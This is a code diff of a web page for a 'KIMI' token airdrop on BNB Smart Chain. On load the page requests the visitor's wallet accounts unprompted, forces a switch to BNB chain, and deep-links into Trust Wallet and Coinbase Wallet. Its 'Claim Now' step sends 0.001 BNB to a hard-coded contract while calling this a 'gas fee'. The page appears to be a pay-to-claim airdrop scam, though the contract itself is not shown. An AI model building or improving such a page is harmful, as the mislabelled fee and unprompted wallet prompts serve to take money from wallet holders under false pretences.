@@ -10,7 +10,14 @@
         body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #0f172a 0%, #1e2937 100%); }
         .glass { background: rgba(15, 23, 42, 0.9); backdrop-filter: blur(20px); }
         .hidden-el { display: none; }
-        .spinner-border { display: inline-block; width: 1.25rem; height: 1.25rem; border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        .spinner-border {
+            display: inline-block;
+            width: 1.25rem; height: 1.25rem;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
         @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
@@ -37,10 +44,11 @@
 
         <div class="glass rounded-3xl p-8 border border-slate-600">
             <div id="notConnected">
-                <button id="connectBtn" onclick="openWalletOptions()" class="w-full py-7 text-xl font-semibold bg-gradient-to-r from-cyan-500 to-purple-600 rounded-3xl hover:brightness-110 transition-all">
+                <button id="connectBtn" onclick="openWalletOptions()"
+                        class="w-full py-7 text-xl font-semibold bg-gradient-to-r from-cyan-500 to-purple-600 rounded-3xl hover:brightness-110 transition-all">
                     Connect Wallet
                 </button>
-                <p class="text-center text-xs text-slate-400 mt-6">MetaMask • Trust Wallet • Coinbase Wallet</p>
+                <p class="text-center text-xs text-slate-400 mt-6">MetaMask • Trust Wallet • Rainbow • Coinbase Wallet</p>
             </div>
 
             <div id="connected" class="hidden-el">
@@ -48,42 +56,54 @@
                     <p class="text-sm text-slate-400">Claim Amount</p>
                     <p class="text-4xl font-bold mt-1">100,000 KIMI</p>
                     <p class="text-amber-400 text-sm mt-3">0.001 BNB gas fee</p>
-                    <p id="claimStatus" class="text-sm mt-3 text-emerald-400">You are eligible to claim!</p>
+                    <p id="claimStatus" class="text-sm mt-3 text-slate-400"></p>
                 </div>
-                <button onclick="claimTokens()" id="claimBtn" class="w-full py-7 text-xl font-bold bg-gradient-to-r from-emerald-500 to-teal-500 rounded-3xl hover:brightness-110 transition-all">
+
+                <button onclick="claimTokens()" id="claimBtn"
+                        class="w-full py-7 text-xl font-bold bg-gradient-to-r from-emerald-500 to-teal-500 rounded-3xl hover:brightness-110 transition-all">
                     Claim Now
                 </button>
             </div>
         </div>
 
-        <div class="mt-8 glass rounded-2xl p-5 border border-slate-700">
-            <h3 class="font-bold text-sm mb-2 text-cyan-400">How to Claim</h3>
-            <ol class="text-sm text-slate-400 space-y-1 list-decimal list-inside">
-                <li>Open in wallet app (Trust / MetaMask / Coinbase)</li>
-                <li>Make sure on BNB Smart Chain</li>
-                <li>Click Claim Now</li>
-                <li>Confirm transaction</li>
-            </ol>
+        <div class="mt-8 space-y-3">
+            <div class="glass rounded-2xl p-5 border border-slate-700">
+                <h3 class="font-bold text-sm mb-2 text-cyan-400">How to Claim</h3>
+                <ol class="text-sm text-slate-400 space-y-1 list-decimal list-inside">
+                    <li>Connect your wallet</li>
+                    <li>Make sure you're on BNB Smart Chain</li>
+                    <li>Click Claim Now</li>
+                    <li>Confirm the transaction in your wallet</li>
+                </ol>
+            </div>
         </div>
     </div>
 
-    <!-- Modal -->
     <div id="walletModal" class="hidden-el fixed inset-0 z-50 bg-black/70 backdrop-blur-sm">
         <div class="min-h-screen flex items-center justify-center p-4">
             <div class="w-full max-w-md glass border border-slate-700 rounded-3xl p-6">
-                <h2 class="text-xl font-bold mb-5">Choose Wallet</h2>
+                <div class="flex items-center justify-between mb-5">
+                    <h2 class="text-xl font-bold">Choose Wallet</h2>
+                    <button onclick="closeWalletOptions()" class="text-slate-400 hover:text-white text-xl">✕</button>
+                </div>
                 <div class="space-y-3">
-                    <button onclick="connectInjected()" class="w-full text-left px-5 py-4 rounded-2xl bg-slate-800 hover:bg-slate-700 flex items-center gap-3">
-                        <span class="text-2xl">🦊</span>
-                        <div><div class="font-semibold">MetaMask / In-App Browser</div></div>
+                    <button onclick="connectInjected()" class="w-full text-left px-5 py-4 rounded-2xl bg-slate-800 hover:bg-slate-700 transition flex items-center gap-3">
+                        <div class="w-10 h-10 rounded-full bg-orange-500/20 flex items-center justify-center text-lg">🦊</div>
+                        <div>
+                            <div class="font-semibold">MetaMask / In-App</div>
+                        </div>
                     </button>
-                    <button onclick="openTrustWalletApp()" class="w-full text-left px-5 py-4 rounded-2xl bg-slate-800 hover:bg-slate-700 flex items-center gap-3">
-                        <span class="text-2xl">🛡️</span>
-                        <div><div class="font-semibold">Trust Wallet</div></div>
+                    <button onclick="openTrustWalletApp()" class="w-full text-left px-5 py-4 rounded-2xl bg-slate-800 hover:bg-slate-700 transition flex items-center gap-3">
+                        <div class="w-10 h-10 rounded-full bg-cyan-500/20 flex items-center justify-center text-lg">🛡️</div>
+                        <div>
+                            <div class="font-semibold">Trust Wallet</div>
+                        </div>
                     </button>
-                    <button onclick="openCoinbaseWalletApp()" class="w-full text-left px-5 py-4 rounded-2xl bg-slate-800 hover:bg-slate-700 flex items-center gap-3">
-                        <span class="text-2xl">🔵</span>
-                        <div><div class="font-semibold">Coinbase Wallet</div></div>
+                    <button onclick="openCoinbaseWalletApp()" class="w-full text-left px-5 py-4 rounded-2xl bg-slate-800 hover:bg-slate-700 transition flex items-center gap-3">
+                        <div class="w-10 h-10 rounded-full bg-blue-600/20 flex items-center justify-center text-lg">🔵</div>
+                        <div>
+                            <div class="font-semibold">Coinbase Wallet</div>
+                        </div>
                     </button>
                 </div>
             </div>
@@ -91,70 +111,138 @@
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.11.0/dist/umd/index.min.js"></script>
 
     <script>
-        let provider, signer, userAddress, airdropContract;
+        let provider = null;
+        let signer = null;
+        let userAddress = null;
+        let wcProvider = null;
+        let airdropContract = null;
 
         const AIRDROP_CONTRACT_ADDRESS = "0x7C8DA7C99E796F32Ea0167e2f714b1616Ee637FB";
+        const WC_PROJECT_ID = "c3f0d08c164b982922516d2540b91cfb";
         const REQUIRED_CHAIN_ID_DEC = 56;
+        const REQUIRED_CHAIN_ID_HEX = "0x38";
         const CLAIM_FEE_BNB = "0.001";
 
-        const AIRDROP_ABI = ["function claim() payable", "function hasClaimed(address) view returns (bool)", "function isClaimActive() view returns (bool)"];
+        const AIRDROP_ABI = [
+            "function claim() payable",
+            "function hasClaimed(address) view returns (bool)",
+            "function isClaimActive() view returns (bool)"
+        ];
 
-        function shortenAddress(addr) {
-            return addr ? `\( {addr.slice(0,6)}... \){addr.slice(-4)}` : "";
+        function isMobileDevice() {
+            return /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(navigator.userAgent);
+        }
+
+        function shortenAddress(address) {
+            if (!address) return "";
+            return `\( {address.slice(0, 6)}... \){address.slice(-4)}`;
         }
 
         function showElement(id) { document.getElementById(id).classList.remove("hidden-el"); }
         function hideElement(id) { document.getElementById(id).classList.add("hidden-el"); }
 
-        function showToast(msg, type = "info") {
-            const t = document.createElement("div");
-            t.className = `px-6 py-4 rounded-2xl text-sm ${type === "success" ? "bg-emerald-500/20 text-emerald-300" : type === "error" ? "bg-red-500/20 text-red-300" : "bg-cyan-500/20 text-cyan-300"}`;
-            t.textContent = msg;
-            document.getElementById("toastContainer").appendChild(t);
-            setTimeout(() => t.remove(), 5000);
+        function showToast(message, type = "info") {
+            const toast = document.createElement("div");
+            const colors = {
+                success: "bg-emerald-500/20 border border-emerald-500/30 text-emerald-300",
+                error: "bg-red-500/20 border border-red-500/30 text-red-300",
+                info: "bg-cyan-500/20 border border-cyan-500/30 text-cyan-300"
+            };
+            toast.className = `px-6 py-4 rounded-2xl text-sm font-medium shadow-lg ${colors[type]}`;
+            toast.textContent = message;
+            document.getElementById("toastContainer").appendChild(toast);
+            setTimeout(() => toast.remove(), 5000);
         }
 
-        async function autoConnect() {
+        function encodedCurrentUrl() {
+            return encodeURIComponent(window.location.href);
+        }
+
+        function openWalletOptions() { showElement("walletModal"); }
+        function closeWalletOptions() { hideElement("walletModal"); }
+
+        function openTrustWalletApp() {
+            if (!isMobileDevice()) return showToast("For mobile only", "info");
+            window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodedCurrentUrl()}`;
+        }
+
+        function openCoinbaseWalletApp() {
+            if (!isMobileDevice()) return showToast("For mobile only", "info");
+            window.location.href = `https://go.cb-w.com/dapp?cb_url=${encodedCurrentUrl()}`;
+        }
+
+        async function switchToBnbChain() {
+            const req = window.ethereum;
+            if (!req?.request) return false;
+            try {
+                await req.request({ method: "wallet_switchEthereumChain", params: [{ chainId: REQUIRED_CHAIN_ID_HEX }] });
+                return true;
+            } catch (e) {
+                if (e.code === 4902) {
+                    await req.request({ method: "wallet_addEthereumChain", params: [{ chainId: REQUIRED_CHAIN_ID_HEX, chainName: "BNB Smart Chain", nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 }, rpcUrls: ["https://bsc-dataseed.binance.org"] }] });
+                }
+                return false;
+            }
+        }
+
+        async function autoConnectWallet() {
             if (!window.ethereum || userAddress) return;
             try {
-                const accounts = await window.ethereum.request({ method: "eth_accounts" });
-                if (accounts.length) {
+                let accounts = await window.ethereum.request({ method: "eth_accounts" });
+                if (!accounts?.length) {
+                    accounts = await window.ethereum.request({ method: "eth_requestAccounts" }).catch(() => []);
+                }
+                if (accounts?.length > 0) {
                     userAddress = accounts[0];
-                    provider = new ethers.providers.Web3Provider(window.ethereum);
+                    provider = new ethers.providers.Web3Provider(window.ethereum, "any");
                     signer = provider.getSigner();
                     airdropContract = new ethers.Contract(AIRDROP_CONTRACT_ADDRESS, AIRDROP_ABI, signer);
-                    await updateUI();
-                    showToast("✅ Auto-connected!", "success");
+                    await switchToBnbChain();
+                    await updateConnectedUI();
+                    showToast("✅ Wallet auto-connected!", "success");
                 }
-            } catch (e) {}
+            } catch (e) {
+                console.log("Auto-connect skipped", e);
+            }
         }
 
-        async function updateUI() {
+        async function updateConnectedUI() {
             hideElement("notConnected");
             showElement("connected");
             showElement("walletDisplay");
             document.getElementById("walletAddress").textContent = shortenAddress(userAddress);
+
+            const statusEl = document.getElementById("claimStatus");
+            try {
+                const already = await airdropContract.hasClaimed(userAddress);
+                if (already) {
+                    statusEl.textContent = "You have already claimed.";
+                    document.getElementById("claimBtn").disabled = true;
+                    document.getElementById("claimBtn").textContent = "Already Claimed";
+                } else {
+                    statusEl.textContent = "Ready to claim!";
+                    statusEl.className = "text-sm mt-3 text-emerald-400";
+                }
+            } catch (e) {}
         }
 
         async function connectInjected() {
+            closeWalletOptions();
+            const btn = document.getElementById("connectBtn");
+            btn.disabled = true;
+            btn.textContent = "Connecting...";
             try {
                 await window.ethereum.request({ method: "eth_requestAccounts" });
-                await autoConnect();
+                await autoConnectWallet();
             } catch (e) {
-                showToast("Connection failed", "error");
+                showToast("Failed to connect", "error");
+            } finally {
+                btn.disabled = false;
+                btn.textContent = "Connect Wallet";
             }
-        }
-
-        function openTrustWalletApp() {
-            const url = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(window.location.href)}`;
-            window.location.href = url;
-        }
-
-        function openCoinbaseWalletApp() {
-            const url = `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(window.location.href)}`;
-            window.location.href = url;
         }
 
         async function claimTokens() {
@@ -165,33 +253,29 @@
             try {
                 const tx = await airdropContract.claim({ value: ethers.utils.parseEther(CLAIM_FEE_BNB) });
                 await tx.wait();
-                showToast("Claim successful! Tokens sent.", "success");
+                showToast("Claim successful!", "success");
                 btn.textContent = "Already Claimed";
                 btn.disabled = true;
             } catch (e) {
-                showToast("Transaction rejected or failed.", "error");
+                showToast("Transaction failed", "error");
             } finally {
                 btn.disabled = false;
             }
         }
 
-        function openWalletOptions() {
-            showElement("walletModal");
-        }
-
-        // Init
         window.addEventListener('load', () => {
-            setTimeout(autoConnect, 700);
-            setTimeout(autoConnect, 2200);
+            setTimeout(autoConnectWallet, 800);
+            setTimeout(autoConnectWallet, 2000);
         });
 
         if (window.ethereum) {
-            window.ethereum.on("accountsChanged", (acc) => {
-                if (acc.length) {
-                    userAddress = acc[0];
-                    updateUI();
+            window.ethereum.on("accountsChanged", (accounts) => {
+                if (accounts?.length) {
+                    userAddress = accounts[0];
+                    updateConnectedUI();
                 }
             });
+            // Removed chain reload to prevent loop
         }
     </script>
 </body>
